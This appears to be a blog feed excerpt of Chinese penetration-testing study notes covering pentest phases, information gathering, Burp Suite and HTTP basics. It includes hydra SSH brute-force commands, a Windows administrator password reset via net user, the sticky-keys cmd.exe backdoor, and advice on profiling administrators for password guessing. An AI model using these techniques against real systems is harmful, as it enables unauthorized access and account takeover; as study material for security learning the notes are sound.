title="漏洞分析"></a>漏洞分析</h3><p>综合前几个环节获取到的信息，特别是安全漏洞扫描结果、服务查点信息等，通过搜索可获取的渗透代码资源，找出可实施渗透攻击的攻击点，并在实验环境中进行验证。从中分析与理解哪些攻击途径是可行的。在确定出最可行的攻击通道后，需考虑如何获取目标系统的访问控制权<br>此阶段，高水平渗透测试团队还会针对攻击通道上的一些关键系统与服务进行安全漏洞探测与挖掘，期望找出可被利用的未知安全漏洞，并开发出渗透代码，从而打开攻击通道上的关键路径</p><h3 id="渗透攻击"><a href="#渗透攻击" class="headerlink" title="渗透攻击"></a>渗透攻击</h3><p>最后是基本确信特定渗透攻击会成功时，才真正对目标系统实施此次渗透攻击，当然在目标系统中，可能催在一些未曾预期到的安全防护措施，使得此次渗透攻击无法陈公公。但需铭记，在尝试触发一个漏洞时，需清晰地了解在目标系统上存在特定漏洞</p><h3 id="后渗透攻击"><a href="#后渗透攻击" class="headerlink" title="后渗透攻击"></a>后渗透攻击</h3><p>是整个渗透测试过程中最为体现渗透测试团队创造力与技术能力的环节。此环节需根据目标组织的业务经营模式、保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能对客户组织造成最重要业务影响的攻击途径<br>在不同渗透测试场景中，攻击目标与途径千变万化，而是否准确并可行，也取决于团队自身的创新意识、知识范畴、实际经验和技术能力</p><h3 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h3><p>渗透测试过程最终向客户组织提交，凭借渗透测试报告取得认可并成功获得合同付款。此报告凝聚了之前所有阶段中渗透测试团队所获取的关键情报信息、探测和发掘出的系统安全漏洞、成功渗透攻击的过程以及造成业务影响后果的攻击途径，同时还需站在防御者的角度，帮助客户组织分析安全防御体系中的薄弱环节、存在的问题、以及修补与升级技术方案</p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="端口服务爆破"><a href="#端口服务爆破" class="headerlink" title="端口服务爆破"></a>端口服务爆破</h3><p>burp suite 的 intruder 模块：登陆，web登陆界面<br>hydra：端口，ftp ssh mysql mssql 3389 oracle</p><p>基本格式<br>hydra -l 用户名 -p 密码 协议://ip</p><p>例如：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l root -p root ssh://xxx.xxx.xxx.xxx<br>hydra -l root -p root xxx.xxx.xxx.xxx ssh<br>hydra -L 用户名.txt -P 密码.txt xxx.xxx.xxx.xxx ssh<br></code></pre></td></tr></table></figure></p><hr><h3 id="提权方法"><a href="#提权方法" class="headerlink" title="提权方法"></a>提权方法</h3><h4 id="提权方法1"><a href="#提权方法1" class="headerlink" title="提权方法1"></a>提权方法1</h4><p>查看所有用户：<br>net user<br>Administrator</p><p>修改用户密码<br>net user Administrator root123</p><p>远程桌面：<br>windows+R  mstsc 登陆桌面<br>获取桌面flag.txt内容：<br>xxllxx_safedog_tiquan</p><p>获取网络根目录flag.txt内容：<br>xxllxx_www_heheda</p><h4 id="提权方法2："><a href="#提权方法2：" class="headerlink" title="提权方法2："></a>提权方法2：</h4><p>粘滞键提权<br>copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe</p><p>远程桌面：<br>windows+R  mstsc<br>登陆界面连按5下shift键，弹出cmd<br>输入contrl进入桌面</p>]]></content>
      
      
      
        <tags>
            
            <tag> Penetration Testing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>信息收集</title>
      <link href="/2018/12/26/Information-gathering/"/>
      <url>/2018/12/26/Information-gathering/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>百度百科解释</p><blockquote><p>信息收集（Information Gathering），信息收集是指通过各种方式获取所需要的信息。信息收集是信息得以利用的第一步，也是关键的一步。信息收集工作的好坏，直接关系到整个信息管理工作的质量。信息可以分为原始信息和加工信息两大类。原始信息是指在经济活动中直接产生或获取的数据、概念、知识、经验及其总结，是未经加工的信息。加工信息则是对原始信息经过加工、分析、改编和重组而形成的具有新形式、新内容的信息。两类信息都对企业的营销管理活动发挥着不可替代的作用。</p></blockquote><hr><h2 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h2><p>尽可能多的去搜集目标环境各类信息，母的是获取渗透目标的准确信息，以了解目标组织的运作方式，确定最佳的进攻路线。</p><ul><li><strong>针对服务器</strong>：要扫描的信息一般包括IP、操作系统类型版本，端口</li><li><strong>针对网站</strong>：尝试收集的是源码、robots文件、后台地址</li><li><strong>针对管理员</strong>：即针对某个登陆验证密码的猜解。要搜集这个管理员的各种信息，如：生日、手机号、qq、论坛常用ID等</li></ul><p>若信息收集工作不够细致，则可能会与可利用的系统漏洞或可实施攻击的目标失之交臂</p><hr><h2 id="具体方法"><a href="#具体方法" class="headerlink" title="具体方法"></a>具体方法</h2><h3 id="查看服务器类型"><a href="#查看服务器类型" class="headerlink" title="查看服务器类型"></a>查看服务器类型</h3><p>手工爬取所有页面，搜集邮箱，文章发表用户，评论者用户名，“联系我们”的邮箱，手机号等。<br>修改html为HTML，页面正常。<br>注：linux对文件名大小写敏感，Windows不敏感</p><hr><h3 id="Web站点信息收集"><a href="#Web站点信息收集" class="headerlink" title="Web站点信息收集"></a>Web站点信息收集</h3><p>例子：<br><strong>站点类型</strong></p><ul><li>开源cms：dede</li><li>论坛：discus</li><li>博客系统：WordPress</li></ul><p><strong>对应版本</strong><br>是否存在已公开的漏洞信息</p><hr><h3 id="查找对应框架已知漏洞"><a href="#查找对应框架已知漏洞" class="headerlink" title="查找对应框架已知漏洞"></a>查找对应框架已知漏洞</h3><p>求助强大的搜索引擎：<br>Google、Baidu、Bing等</p><p>安全资讯类网站：<br>360安全播报、Freebuf、Seebug、Exploit-db</p><hr><h3 id="目标扫描与查找"><a href="#目标扫描与查找" class="headerlink" title="目标扫描与查找"></a>目标扫描与查找</h3><p>工具查找：御剑<br>搜索引擎：Google Hack</p><h3 id="敏感文件的查找"><a href="#敏感文件的查找" class="headerlink" title="敏感文件的查找"></a>敏感文件的查找</h3><p>敏感文件：后台地址、网站源码压缩包、数据库备份文件等<br>工具：御剑<br>搜索引擎：Google Hack</p><hr><h3 id="Github活用"><a href="#Github活用" class="headerlink" title="Github活用"></a>Github活用</h3><h3 id="从报错信息中得到价值信息"><a href="#从报错信息中得到价值信息" class="headerlink" title="从报错信息中得到价值信息"></a>从报错信息中得到价值信息</h3><p>比如以IIS为容器的网站报错页面</p><hr><h3 id="IP查询"><a href="#IP查询" class="headerlink" title="IP查询"></a>IP查询</h3><p>命令：<code>ping</code>,<code>nslookup</code><br>在线工具网站：<br><a href="http://tool.chinaz.com/" target="_blank" rel="noopener"><strong>站长工具（建站相关</strong>）</a><br><a href="http://www.ip138.com:8080/search.asp" target="_blank" rel="noopener"><strong>ip138（手机号归属地）</strong></a><br><a href="ifconfig.me"><strong>局域网内获取自身外网IP</strong></a><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl ifconfig.me<br></code></pre></td></tr></table></figure></p><hr><h3 id="服务器探测——端口扫描"><a href="#服务器探测——端口扫描" class="headerlink" title="服务器探测——端口扫描"></a>服务器探测——端口扫描</h3><p>探测服务器开启了哪些端口服务<br>工具：NMAP，御剑，telnet以及一些网上的小脚本，也可使用在线扫描工具进行扫描</p><hr><h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p><strong>端口</strong>即英文<code>Port</code>的意译，可认为是<strong>设备</strong>与外界通讯交流的出口。<br>端口可分为</p><blockquote><p><strong>虚拟端口</strong>：<br>指计算机内部或交换机路由器内的端口，不可见。例如计算机中的80端口、21端口、23端口等。</p></blockquote><blockquote><p><strong>物理端口</strong>：<br>物理端口又称接口，是可见的。计算机背板的RJ45网口，交换机路由器集线器等RJ45端口。电话使用RJ11端口也属于物理端口的范畴</p></blockquote><hr><h4 id="常见服务默认端口"><a href="#常见服务默认端口" class="headerlink" title="常见服务默认端口"></a>常见服务默认端口</h4><ul><li><p>WEB类（第三方通用组件）<br><code>80，80-89，8000-9090</code></p></li><li><p>数据库类（扫描弱口令）<br><code>1433</code>:<code>Mssql</code><br><code>1521</code>:<code>Oracle</code><br><code>3306</code>:<code>Mysql</code><br><code>5432</code>:<code>PostgreSQL</code></p></li><li><p>特殊服务类（考虑未授权/命令执行/漏洞）<br><code>443</code>:SSL心脏地学<br><code>873</code>:Rsync未授权<br><code>6379</code>:redis未授权<br><code>7001,7002</code>:weblogic默认口令，反序列</p></li><li><p>常用端口类（扫描口令）<br><code>21</code>:<code>ftp</code><br><code>22</code>:<code>SSH</code><br><code>23</code>:<code>Telnet</code><br><code>3389</code>:远程桌面</p></li></ul><hr><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>主机发现、端口探测、指纹识别<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">NMAP &lt;扫描选项&gt; &lt;扫描参数&gt;<br></code></pre></td></tr></table></figure></p><h4 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h4><p><code>-Pn</code> 不使用ping的情况下进行nmap扫描<br><code>-sS</code> 仅仅使用发送的SYN包的情况下进行扫描</p><p><code>-sV</code> 探测服务版本<br><code>-O</code> 判断操作系统<br><code>-sU</code> 基于UDP的扫描</p><p><code>-A</code> 探测服务版本并判断操作系统的详细扫描<br><code>-F</code> 快速扫描<br><code>-T</code> 关于扫描延迟<br><code>-P</code> 指定端口</p><p><strong>tip</strong><br><code>Zenmap</code>是<code>namp</code>的图形化版，用法完全一致</p><hr><h3 id="网络设备探测器-搜索器"><a href="#网络设备探测器-搜索器" class="headerlink" title="网络设备探测器/搜索器"></a>网络设备探测器/搜索器</h3><h4 id="ZomeEye"><a href="#ZomeEye" class="headerlink" title="ZomeEye"></a>ZomeEye</h4><p>一个面向网络空间的搜索引擎</p><h4 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h4><p>国外的一款同类软件</p><hr><h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>查询网站的相关信息：<br>站长工具，爱站网，ip138等</p><hr><h3 id="通过扫描工具获取信息"><a href="#通过扫描工具获取信息" class="headerlink" title="通过扫描工具获取信息"></a>通过扫描工具获取信息</h3><p><code>Awvs，appscan，nessue</code><br>微步在线，seebug照妖镜，安犬，火蚁</p><p>特定扫描工具或者<br>poc<br>St2-045<br>Java反序列化利用工具<br>以及一些小脚本</p><hr><h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><h3 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h3><ul><li>删除</li><li>灌水</li></ul><hr><h3 id="主机信息收集"><a href="#主机信息收集" class="headerlink" title="主机信息收集"></a>主机信息收集</h3><p>利用<code>nmap</code>等扫描工具，收集端口、服务、主机版本</p><h3 id="舆论"><a href="#舆论" class="headerlink" title="舆论"></a>舆论</h3><p>收集目标资产信息，正面信息和负面信息</p><h3 id="对人"><a href="#对人" class="headerlink" title="对人"></a>对人</h3><p>姓名、年龄、生日、家庭、工作单位、爱好、住址等</p><h2 id="社工字典"><a href="#社工字典" class="headerlink" title="社工字典"></a>社工字典</h2><p>一个积累的过程。</p><p>社工字典生成可参考：<br><a href="https://github.com/alpha1e0/pentestdb" target="_blank" rel="noopener"><strong>PentestDB</strong></a></p><hr><h2 id="自我思考"><a href="#自我思考" class="headerlink" title="自我思考"></a>自我思考</h2><p>收集自己的泄露信息，思考弥补方案</p><hr><h2 id="信息搜集与社工"><a href="#信息搜集与社工" class="headerlink" title="信息搜集与社工"></a>信息搜集与社工</h2><blockquote><p>从手法来说，存粹社工可能威力有限，不过混合攻击里，社工能发挥出其他类型攻击无法起到的作用。毕竟很少存在社工防火墙、社工扫描器、社工WAF，国内也没人卖社工渗透测试，即使搞定目标，只会轻描淡写一句：弱密码而已。谁知背后花多少功夫？</p></blockquote><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h3><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><h4 id="百度百科解释"><a href="#百度百科解释" class="headerlink" title="百度百科解释"></a>百度百科解释</h4><blockquote><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</p></blockquote><hr><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li>网络加速</li><li>隐藏真实IP（虚假IP由CDN服务的IP池提供）</li></ul><hr><h4 id="寻找真实IP方法"><a href="#寻找真实IP方法" class="headerlink" title="寻找真实IP方法"></a>寻找真实IP方法</h4><ol><li>社工：直接进入机房获取</li><li>反向连接：比如命令执行使之<code>curl</code>自己的网站</li><li>过往DNS解析记录：查找还未使用CDN之前的解析记录</li></ol><hr><h3 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h3><blockquote><p>robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。</p></blockquote><hr><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p><a href="https://www.freebuf.com/articles/web/160001.html" target="_blank" rel="noopener">新手科普 | 渗透测试之信息收集</a></p><p>插件：网站指纹识别<br>wappalyzer</p><p>灾备</p><p>为什么ping 不加 http<br>ping 是icmp协议，与http协议不能连用</p>]]></content>
      
      
      
        <tags>
            
            <tag> information gathering </tag>
            
            <tag> Social engineering </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Burpsuite</title>
      <link href="/2018/12/25/Burpsuite/"/>
      <url>/2018/12/25/Burpsuite/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>Burpsuite是用于攻击WEB应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。<br>所有工具都共享一个能处理并显示HTTP消息、持久性、认证、代理、日志、报警的一个强大的可扩展的框架</p></blockquote><h2 id="工具箱"><a href="#工具箱" class="headerlink" title="工具箱"></a>工具箱</h2><p><strong><code>proxy</code></strong>：代理，默认地址为<code>127.0.0.1</code>，端口<code>8080</code><br><strong><code>target</code></strong>：站点目标，地图<br><strong><code>spider</code></strong>：爬虫<br><strong><code>scanner</code></strong>：漏洞扫描<br><strong><code>repeater</code></strong>：http请求消息与响应消息修改重放<br><strong><code>intruder</code></strong>：暴力破解<br><strong><code>sequencer</code></strong>：随机数分析<br><strong><code>decoder</code></strong>：各种编码格式和散列转换<br><strong><code>comparer</code></strong>：可视化差异对比功能</p><hr><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol><li>抓登陆请求包</li><li>将请求包发送至<code>intruder</code>模块</li><li>设置爆破位置，对哪些参数进行爆破</li><li>设置爆破字典，使用什么字符对选中位置进行爆破</li><li>开始爆破</li></ol><h3 id="爆破方式"><a href="#爆破方式" class="headerlink" title="爆破方式"></a>爆破方式</h3><ol><li>分别对选择的位置进行爆破</li><li>对多个位置使用同一个字典同时爆破</li><li><code>payload1</code>和<code>payload2</code>对应成组分别爆破</li><li>基于排列组合原理，将所有可能进行组合爆破（最常用的多位置爆破方式）</li></ol><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Payload、exp、poc"><a href="#Payload、exp、poc" class="headerlink" title="Payload、exp、poc"></a>Payload、exp、poc</h3><p><strong><code>payload</code></strong>：攻击载荷，即漏洞的利用方式<br><strong><code>exploite（exp）</code></strong>：漏洞的利用方式，要出现利用结果<br><strong><code>poc</code></strong>：漏洞验证方式，出现是否存在漏洞的验证结果</p><h3 id="火狐代理设置"><a href="#火狐代理设置" class="headerlink" title="火狐代理设置"></a>火狐代理设置</h3><p>Firefox代理不影响全局代理</p>]]></content>
      
      
      
        <tags>
            
            <tag> Burpsuite </tag>
            
            <tag> Tool </tag>
            
            <tag> Violent Crack </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HTTP协议基础</title>
      <link href="/2018/12/24/Http-protocol/"/>
      <url>/2018/12/24/Http-protocol/</url>
      
        <content type="html"><![CDATA[<h3 id="模型基础"><a href="#模型基础" class="headerlink" title="模型基础"></a>模型基础</h3><h4 id="模型结构"><a href="#模型结构" class="headerlink" title="模型结构"></a>模型结构</h4><p>最开始提出的叫做开放系统互连基本参考模型OSI/RM模型，叫做国际标准，但由于种种原因，非国际<br>标准的TCP/IP模型成为当前主流标准。</p><blockquote><p>OSI模型七层：物理层、数据链路层、网络层、运输层、会话层、表示层、应用层<br>TCP/IP模型四层：网络接口层、网际层、运输层、应用层</p></blockquote><p>为方便讲述计算机网络原理，通常结合为五层讲：</p><blockquote><ol><li><strong>物理层</strong>：主要规定电气特性，必须按照标准使用哪些硬件。如：调制解调器、PLC、SONET/SDH、G.709、光导纤维、同轴电缆、双绞线，其中数据单元是比特，典型设备有：中继器、集线器、网线、HUB</li><li><strong>数据链路层</strong>：有ARQ、CSMA/CD、PPP、LCP、HDLC、ATM等协议，其数据单元为帧，典型设备有：网卡、网桥、交换机</li><li><strong>网络层</strong>：有ARQ、RARP、ICMP、IGMP、RIP、OSPF、BGP、IS-IS、IPSec等协议，其数据单元为：数据包，典型设备有：路由器、防火墙、多层交换机</li><li><strong>传输层</strong>：有TCP、UDP、DCCP、SCTP、RTP、RSVP、PPTP等协议，其数据单元为数据段，典型设备有端口和进程</li><li><strong>应用层</strong>：有DHCP、FTP、HTTP、SMTP、POP3、IMAP、SMTP、SSH、TELNET、RPC、TLS、SOAP、DNS等协议，典型设备有：应用程序，如：FTP、SMTP、HTTP</li></ol></blockquote><p><strong>越往高层走，越偏向软件化</strong></p><hr><h3 id="通信基础"><a href="#通信基础" class="headerlink" title="通信基础"></a>通信基础</h3><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><p>当在应用层活动时，产出的数据需要与其它计算机通信时，会发生如下过程：</p><blockquote><ol><li>应用层数据，先按照运输层协议标准，封装到运输层数据里（数据段）</li><li>接着运输层的数据（数据段），会按照网络层协议的标准，封装到网络层数据里（数据包/报文）</li><li>接着这些数据包会按照链路层协议标准，封装到链路层数据里（帧）</li><li>数据帧按照物理层电气特性，转换为二进制比特流发送出去</li><li>网络会把这些流数据，不断拆封再封装，直至到达目标主机。然后又目标主机依层拆封数据，进行反解析，完成传递</li></ol></blockquote><p><strong>可参考链接：</strong><a href="https://blog.csdn.net/cjf1002361126/article/details/70232721" target="_blank" rel="noopener">数据包结构分析</a></p><hr><h4 id="TCP-UDP协议格式"><a href="#TCP-UDP协议格式" class="headerlink" title="TCP/UDP协议格式"></a>TCP/UDP协议格式</h4><p><strong>可参考链接：</strong><a href="https://blog.csdn.net/u014711094/article/details/80501953" target="_blank" rel="noopener">TCP/UDP协议格式</a></p><hr><h4 id="IP协议格式"><a href="#IP协议格式" class="headerlink" title="IP协议格式"></a>IP协议格式</h4><p><strong>可参考链接：</strong><a href="https://blog.csdn.net/marywang56/article/details/78051556" target="_blank" rel="noopener">IP协议格式</a></p><hr><h4 id="帧协议格式"><a href="#帧协议格式" class="headerlink" title="帧协议格式"></a>帧协议格式</h4><p>以太网帧格式较复杂，有四种，分别是:</p><blockquote><p>Ethernet Ⅱ、Novell Ethernet、IEEE 802.3/802.2、Ethernet SNAP</p></blockquote><p>不论帧格式如何规定，始终在帧头部包含有目的mac地址，源mac地址，后面跟数据段，结尾加CRC校验码。<br>在计算机中，实际是使用MAC地址寻找主机的。</p><hr><h4 id="三次握手、四次挥手"><a href="#三次握手、四次挥手" class="headerlink" title="三次握手、四次挥手"></a>三次握手、四次挥手</h4><hr><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><blockquote><p>HTTP(Hyper Text Transfer Protocol)超文本传输协议，是用于从万维网（WWW:World wide Web）服务器传输超文本到本地浏览器的传送协议。<br>HTTP是一个基于TCP/IP通信协议来传输数据（HTML文件、图片文件、查询结果等）<br>HTTP是一个属于应用层的面向对象协议，由于其便捷、快速的方式，适用于分布式超媒体信息系统。它于1990年提出，经过几年的使用与发展，得到不断地完善和扩展。目前在WWW中广泛使用的是HTTP/1.1。</p></blockquote><hr><h4 id="协议说明"><a href="#协议说明" class="headerlink" title="协议说明"></a>协议说明</h4><p>B/S架构的系统使用的协议为HTTP协议。浏览器作为HTTP客户端通过URL向HTTP服务端即web服务器发送所有请求。web服务器根据收到的请求后，向客户端发送响应信息。</p><hr><h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h4><ul><li>简单快速：客户向服务器请求服务时，只需传递请求方法和路径。常用方法：GET、HEAD、POST。各方法规定了客户与服务器联系的类型不同</li><li>灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记</li><li>无连接：限制每次链接只处理一个请求。服务器处理完客户的请求并收到其应答后，即断开连接。此方法可节省传输时间。</li><li>无状态：HTTP为无状态协议。指对于事物处理无记忆能力。缺少状态意味着如果后续处理需要之前的信息，则必须重传，这样可能导致每次连接传输的数据量增大。另外，在服务器不需要先前信息时它的应答则较快</li><li>支持B/S及C/S模式：B/S即使用浏览器通过HTTP协议和服务器通信，C/S即在其他软件中编程实现和服务器的HTTP通信</li></ul><hr><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>URL(Uniform Resource Locator)统一资源定位符，是互联网上用来标识某一处资源的地址。</p><hr><h4 id="Request请求格式"><a href="#Request请求格式" class="headerlink" title="Request请求格式"></a>Request请求格式</h4><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p><blockquote><p>四部分：请求行（request line）、请求头部（header）、空行和请求数据</p></blockquote><h4 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h4><p>依据HTTP标准，HTTP请求可以使用多种请求方法：<br>HTTP1.0</p><blockquote><p>GET,POST,HEAD</p></blockquote><p>HTTP1.1</p><blockquote><p>GET,POST,HEAD,OPTIONS,PUT,DELETE,TRACE,CONNECT</p></blockquote><table><thead><tr><th><strong>请求方法</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>GET</td><td>请求指定的页面信息，并返回实体主页</td></tr><tr><td>HEAD</td><td>类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或上传文件）。数据被包含在请求实体中。POST请求可能会导致新的资源的建立或已有资源的修改</td></tr><tr><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容</td></tr><tr><td>DELETE</td><td>请求服务器删除指定的页面</td></tr><tr><td>CONNECT</td><td>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</td></tr><tr><td>OPTIONS</td><td>允许客户端查看服务器的性能</td></tr><tr><td>TRACE</td><td>回显服务器收到的消息，主要用于测试或诊断</td></tr></tbody></table><hr><h4 id="GET-POST请求举例"><a href="#GET-POST请求举例" class="headerlink" title="GET/POST请求举例"></a>GET/POST请求举例</h4><hr><h4 id="GET与POST异同"><a href="#GET与POST异同" class="headerlink" title="GET与POST异同"></a>GET与POST异同</h4><p>PHP通过GET和POST获取客户端发送的数据<br>相同点：</p><blockquote><ul><li>GET和POST都可以创建数组。如：<code>array(key =&gt; value, key1 =&gt; value1, ...)</code>此数组包含键/值对，其中的键是表单控件的名称，值是来自用户的输入数据</li><li>GET和POST通常被视作<code>$_GET</code>和<code>$_POST</code>，是超全局变量，对他们的访问无需考虑作用域，无需任何代码，能够从任何函数、类或文件访问</li></ul></blockquote><p>不同点：</p><blockquote><ul><li><code>$_POST</code>是通过HTTP POST传递到当前脚本的变量数组。<code>$_GET</code>是通过URL参数传递到当前脚本的变量数组</li><li>GET可以直接在地址栏中看到、修改</li><li>POST须使用工具来查看内容</li></ul></blockquote><hr><h4 id="响应消息举例"><a href="#响应消息举例" class="headerlink" title="响应消息举例"></a>响应消息举例</h4><hr><h3 id="HTTP状态码"><a href="#HTTP状态码" class="headerlink" title="HTTP状态码"></a>HTTP状态码</h3><p>状态码有三位数字组成，第一位定义了响应类别，共分五种类别：</p><blockquote><p>1xx：指示信息，标识请求已接受，继续处理<br>2xx：成功，标识请求已被成功接收、理解、接受<br>3xx：重定向，要完成请求必须进行更进一步的操作<br>4xx：客户端错误，请求有语法错误或请求无法实现<br>5xx：服务器端错误，服务器未能实现合法的请求</p></blockquote><p>常见的还有：</p><blockquote><p>200：OK 请求已成功，请求所希望的响应头或数据体将随此响应返回。出现此状态码是表示正常状态</p></blockquote><blockquote><p>302：Move temporarily<br>请求的资源临时从不同的 URI响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。</p></blockquote><blockquote><p>304：Not Modified<br>如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。</p></blockquote><blockquote><p>400：Bad Request</p><ol><li>语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。</li><li>请求参数有误。</li></ol></blockquote><blockquote><p>404：Not Found<br>请求失败，请求所希望得到的资源未被在服务器上发现。</p></blockquote><blockquote><p>500：Internal Server Error<br>服务器遇到了一个未曾预料的状况，导致了它无法完成对请求的处理。一般来说，这个问题都会在服务器端的源代码出现错误时出现。</p></blockquote><hr><h4 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h4><p>https == http + ssl/tls<br>ssl：安全套接字（传输层到应用层之间）<br>tls：ssh的升级版<br>ssl 3.0 == tls 1.0</p><p>CA：第三方数字证书可信机构</p>]]></content>
      
      
      
        <tags>
            
            <tag> Http </tag>
            
            <tag> TLS </tag>
            
            <tag> SSL </tag>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>B/S架构</title>
      <link href="/2018/12/18/B-S-frame/"/>
      <url>/2018/12/18/B-S-frame/</url>
      
        <content type="html"><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p>B/S结构（Browser/Server，浏览器/服务器模式），是WEB兴起后的一种网络结构模式，WEB浏览器是客户端最主要的应用软件。这种模式统一了客户端，将系统功能实现的核心部分集中到服务器上，简化了系统的开发、维护和使用。客户机上只要安装一个浏览器。如Netscape Navigator或Internet Explorer，服务器安装SQL Server、Oracle、MYSQL等数据库。浏览器通过Web Server 同数据库进行数据交互。</p></blockquote><hr><h2 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>在很多时候，需要跟踪浏览器在整个网站的活动，对其身份进行自动或半自动的识别（即网站登录之类的功能）。此时，常采用Cookie和Session来追踪和判断</p><hr><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>Session信息是存放在Server端，但Session id是存放在Client Cookie的，当然php的Session存放方法是多样化的，这样即使禁用Cookie依旧可以跟踪<br>Cookie则完全保持在客户端的。如：IE、Firefox、Chrome。当客户端禁止Cookie时将不能使用。</p><hr><h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><h4 id="一些特征"><a href="#一些特征" class="headerlink" title="一些特征"></a>一些特征</h4><p><strong>作用</strong>：身份认证<br><strong>来源</strong>：由响应包中的set-cookie字段下发<br><strong>使用</strong>：每次请求页面时，请求包带上cookie字段<br><strong>存放</strong>：浏览器本地，浏览器可以禁用cookie，达到一定程度的防追踪<br><strong>生存周期</strong>：开发人员决定，但可手动使其失效（例如：退出登陆）<br>即被他人截取到cookie后，及时退出，浏览器放出退出请求，服务器接收到请求并执行，使cookie失效，避免损失</p><hr><h4 id="常见使用方法"><a href="#常见使用方法" class="headerlink" title="常见使用方法"></a>常见使用方法</h4><p>服务器在客户端保存用户的信息，如：登录名，密码等。这些数据的量并不大，服务器端在需要时可从客户端读取，保存在客户端的浏览器缓存目录下。</p><ol><li>当浏览器访问<code>cookie.php</code>时，服务器还（huan）以<code>Set-Cookie:name=zxf;expire=Wed,21-Sep-2017 20:14 